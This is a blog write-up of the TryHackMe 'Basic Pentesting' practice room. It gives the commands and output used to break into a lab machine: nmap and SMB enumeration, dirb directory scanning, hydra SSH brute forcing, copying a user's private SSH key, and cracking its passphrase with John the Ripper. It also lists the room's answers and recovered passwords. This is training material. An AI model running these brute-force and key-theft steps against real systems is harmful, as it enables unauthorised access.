---
title: "TryHackMe Basic Pentesting WriteUp"
url: /WriteUps/TryHackMe/BasicPentesting
date: 2022-10-01
draft: false
tags: ['TryHackMe','WriteUp','Nmap','SMB','Hydra','John the Ripper','PrivillegeEscalation','Hash Cracking','Brute Forcing']
icon: '/images/coverimages/BasicPentesting.png'
description: 'This is a machine that allows you to practise web app hacking and privilege escalation.'
---

![Cover Image](/images/coverimages/BasicPentesting.png "TryHackMe Room Basic Pentesting")
[Room Link: Basic Pentesting](https://tryhackme.com/room/basicpentestingjt "TryHackMe Room: Basic Pentesting")

# TryHackMe Basic Pentesting WriteUp
This is a write up of the Basic Pentesting room on TryHackMe (linked above). This is breaking into a machine that has been poorly secured due to a user with a weak password.

Before starting the room I created a `BasicPentesting` folder in my `Documents` where I will store copies of all of the files that I gether while completing this box.

## Task 1
Deploy the vulnerable machine and connect to TryHackMe, this can be done using by starting the `AttackBox` or by downloading the OpenVPN profile provided to users.

### Question 1 - No Answer Required

### Question 2 - No Answer Required
Now that I had connected to TryHackMe services I ran an Nmap scan using the command `nmap -sC -sV 10.10.210.123 -oN Documents/TryHackMe/BasicPentesting/NmapScan.txt`, using the `-oN` with the nmap scan means that the output will be saved to a file and outputted onto the screen. 

NmapScan.txt
```
# Nmap 7.92 scan initiated Fri Sep 16 20:05:19 2022 as: nmap -sC -sV -oN Documents/TryHackMe/BasicPentesting/NmapScan.txt 10.10.210.123
Nmap scan report for 10.10.210.123
Host is up (0.049s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http-proxy
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
| fingerprint-strings: 
|   giop: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2243
|     Date: Fri, 16 Sep 2022 19:08:04 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><bod
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=9/16%Time=6324C993%P=x86_64-pc-linux-gnu%r(gi
SF:op,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-
SF:8\r\nContent-Language:\x20en\r\nContent-Length:\x202243\r\nDate:\x20Fri
SF:,\x2016\x20Sep\x202022\x2019:08:04\x20GMT\r\nConnection:\x20close\r\n\r
SF:\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x2
SF:0400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/css
SF:\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-co
SF:lor:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-se
SF:rif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20{fon
SF:t-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;f
SF:ont-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:b
SF:lack;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-se
SF:rif;color:white;background-color:#525D76;}\x20p\x20{font-family:Tahoma,
SF:Arial,sans-serif;background:white;color:black;font-size:12px;}\x20a\x20
SF:{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;ba
SF:ckground-color:#525D76;border:none;}</style></head><bod");
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-09-16T19:08:04
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2022-09-16T15:08:04-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 16 20:08:05 2022 -- 1 IP address (1 host up) scanned in 166.42 seconds

```

![Image 1](/images/tryhackme/BasicPentesting/01BasicPentesting.png)

Looking at the ports that are open there appears to be an SMB share, SSH connection into the machine is also open. Something that we could also take a look at would be the website that seems to be available. To start off with I am going to take a look at the SMB share, the results of the nmap scan show us that we can use a guest account to see what is there. 

First command I am going to run is SMBmap which will show the different shares that you can possibly connect to `smbmap -u guest -H 10.10.210.123 > Documents/TryHackMe/BasicPentesting`. From the results of this command we can see that there is a read only share that we can look at. I used SMBget to download the contents of that share `smbget -R smb://10.10.210.123/anonymous`, what it downloaded was a file called `staff.txt`. Opening the document showed a message.

![Image 2](/images/tryhackme/BasicPentesting/03BasicPentesting.png)
![Image 3](/images/tryhackme/BasicPentesting/04BasicPentesting.png)

staff.txt
```
```

Within the message there are 2 names mentioned Jan and Kay. Knowning this I tried to see if I could connect to any SMB shares using their names (without a password) but it kept logging me in as anonymous.

After having checked the SMB share as much as we can for the time being I moved onto the website. Loading it up in a web browser did not show much but there was a message within the html that we could see using the inspect element. Using the `dirb` tool within kali we can scan through possible sub directories of the website. `dirb http://10.10.210.123 /usr/share/wordlists/dirb/common.txt` this scan is using a wordlist that comes with dirb of the most common directories used for websites.

![Image 4](/images/tryhackme/BasicPentesting/05BasicPentesting.png)
![Image 5](/images/tryhackme/BasicPentesting/06BasicPentesting.png)
When the scan first completed I thought that it had not come up with anything, so I ran the scan again using `-w` which it told me to do but it came up with the same results. I was kind of stuck for a second because I did not really know where to go from here but then I realised the `/development` section that the scan found was the thing I was looking for. Loading it up within my browser (`http://10.10.210.123/development`) there were 2 files.

![Image 6](/images/tryhackme/BasicPentesting/07BasicPentesting.png)

### Question 3 - `development`

dev.txt
```

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

j.txt
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

The first document just appeared to be a chat log between 2 people but the second one seemed to imply that the password for jan's account was weak which is something that we can work with. Looking back at the results of the nmap scan again ssh is open and using a tool like hydra we can crack a ssh password so long as we have the right wordlist. Given that the password is weak it is likely to be within the rockyou.txt wordlist. 

Using the command `hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 6 10.10.210.123 ssh` I started the brute force attack on jan's password. Now I have to read the man page for hydra every time that I use it, another good thing to look at is the [kali tools](https://www.kali.org/tools/) page for [hydra](https://www.kali.org/tools/hydra/#hydra). This took a while so I began to think that maybe jan was not the right target but then her password was finally found.

HydraJan-SSH.txt
```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-14 16:06:17
[DATA] max 6 tasks per 1 server, overall 6 tasks, 14344399 login tries (l:1/p:14344399), ~2390734 tries per task
[DATA] attacking ssh://10.10.241.77:22/
[STATUS] 66.00 tries/min, 66 tries in 00:01h, 14344333 to do in 3622:19h, 6 active
[STATUS] 52.00 tries/min, 156 tries in 00:03h, 14344243 to do in 4597:31h, 6 active
[STATUS] 43.71 tries/min, 306 tries in 00:07h, 14344093 to do in 5468:53h, 6 active
[STATUS] 43.87 tries/min, 658 tries in 00:15h, 14343741 to do in 5449:45h, 6 active
[22][ssh] host: 10.10.241.77   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-14 16:24:42
```

![Image 7](/images/tryhackme/BasicPentesting/09BasicPentesting.png)

### Question 4 - No Answer

### Question 5 - `jan`

### Question 6 - `armando`

### Question 7 - `SSH`

![Image 8](/images/tryhackme/BasicPentesting/12BasicPentesting.png)

Now that we have jan's password we can log into her account on the machine using SSH. `ssh jan@10.10.210.123`. Once on the machine I want to check if jan has superuser privillages, attempting to do something as the root user when you are not the root user though can alert people of what you are trying to do so be careful. Jan does not have root user privilleges on this machine so we need to find some way of gaining root user privilliges. Looking around the machine there is another user `kay` who has a file called `pass.bak`, this looks like a file we would like access to.

![Image 9](/images/tryhackme/BasicPentesting/13BasicPentesting.png)

### Question 8 - No Answer

### Question 9 - `kay`

### Question 10 - No Answer

To get access to this file though we would need to log into the machine as kay but we do not have access to her password, instead we can use her ssh id_rsa key that is stored within her directory. I ran `cat id_rsa` and then copied the output to my machine. Now that I had the key on my machine I used `chmod` to change the privilleges of the key (SSH keys only have certain privilleges which you can trick it into think it has using `chmod 600 id_rsa`), then I attempted to log into the machine with the id_rsa key `ssh -i id_rsa kay@10.10.210.123` however, using this method the key asked me for a password/passphrase that I did not know so clearly this was not going to work. Using a guide I found online ([linked here](https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/)) you can turn an id_rsa key into a hash that [john the ripper](https://www.kali.org/tools/john/#:~:text=John%20the%20Ripper%20is%20a,it%2C%20if%20it%20is%20desired.) (a kali tool) can then decrypt giving you a password/passphrase. 

![Image 10](/images/tryhackme/BasicPentesting/10BasicPentesting.png)

Following the guide I downloaded a python script from github that I can use to turn the key into a hash that john would understand `wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py`. Running the script `python ssh2john.py id_rsa > id_rsa.hash`. 

Gaining the hash it can be put into john the ripper and using the rockyou.txt wordlist again crack the password `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash`. It took a few minutes but eventually it said the password was `beeswax`.

I then tried to connect to the machine using ssh `ssh kay@10.10.210.123` with the passowrd beeswax but then remembered that beeswax was the passphrase for the id_rsa key. So using `ssh -i id_rsa kay@10.10.210.123` I logged into the machine and used cat on the pass.bak.

![Image 11](/images/tryhackme/BasicPentesting/11BasicPentesting.png)

### Question 11 - heresareallystrongpasswordthatfollowsthepasswordpolicy$$

With that the box is complete.


## Summary
When comparing this room to the previous room that I completed (Kenobi [linked here]({{< ref "/writeups/TryHackMe-Kenobi.md" >}})) there was a lot less hand holding. I also feel that I didn't pay too much attention to the questions that were being asked, instead focusing on making my way through the machine to get to where I felt I needed to be. You can probably see this with the fact that a lot of the questions have been answered in bulk rather than individually when compared with my Kenobi writeup. All in all I enjoyed doing this box and felt that I learnt quite a bit (especially in regards to using ssh keys).

Hope you enjoyed the box as much as I did and I hope this guide helped if you needed it.

